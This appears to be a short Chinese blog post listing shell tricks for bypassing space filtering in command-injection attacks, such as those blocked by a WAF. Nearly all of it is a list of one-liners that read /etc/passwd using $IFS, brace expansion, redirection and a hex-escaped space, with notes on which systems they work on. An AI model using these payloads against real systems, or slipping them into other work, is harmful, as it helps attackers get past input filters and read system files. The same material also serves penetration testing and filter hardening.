# 命令执行绕过空格的姿势

[2020-03-27](/2020/03/27/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC%E7%9A%84%E5%A7%BF%E5%8A%BF/)

在一些漏洞利用场景（如命令执行，SQL注入），或者因为waf等原因，导致无法使用空格时，可以试试如下命令：  

<table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">IFS=,;`cat&lt;&lt;&lt;cat,/etc/passwd`</span><br><span class="line">cat$IFS/etc/passwd</span><br><span class="line">cat${IFS}/etc/passwd</span><br><span class="line">cat&lt;/etc/passwd</span><br><span class="line">{cat,/etc/passwd}</span><br><span class="line">X=$'cat\x20/etc/passwd'&amp;&amp;$X</span><br></pre></td></tr></tbody></table>

经过测试，除最后一条在mac osx下执行失败，这些命令在ubuntu 19.10和centos7下均执行成功。在mac osx系统下系统会将cat\\x20/etc/passwd当成一个可执行文件，会提示No such file or directory。
